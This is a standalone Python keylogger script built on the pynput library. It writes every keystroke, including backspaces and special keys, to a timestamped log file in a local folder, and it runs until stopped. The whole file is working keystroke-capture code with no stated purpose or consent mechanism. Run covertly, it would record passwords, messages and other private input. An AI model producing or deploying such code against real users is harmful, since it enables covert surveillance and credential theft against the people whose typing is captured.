from pynput import keyboard
import os
from datetime import datetime

LOG_DIR = "logs"
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
LOG_FILE = os.path.join(LOG_DIR, f"log_{timestamp}.txt")

IGNORED_KEYS = {
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock
}

# Ensure log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

# Written to the log
def write_log(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)

# Keycapture
def on_press(key):
    try:
        write_log(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            write_log(" ")
        elif key == keyboard.Key.enter:
            write_log("\n")
        elif key == keyboard.Key.tab:
            write_log("\t")
        elif key == keyboard.Key.backspace:
            write_log("[BACKSPACE]")
        elif key in IGNORED_KEYS:
            pass
        else:
            write_log(f"[{key}]")

# Starts keyboard monitoring
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
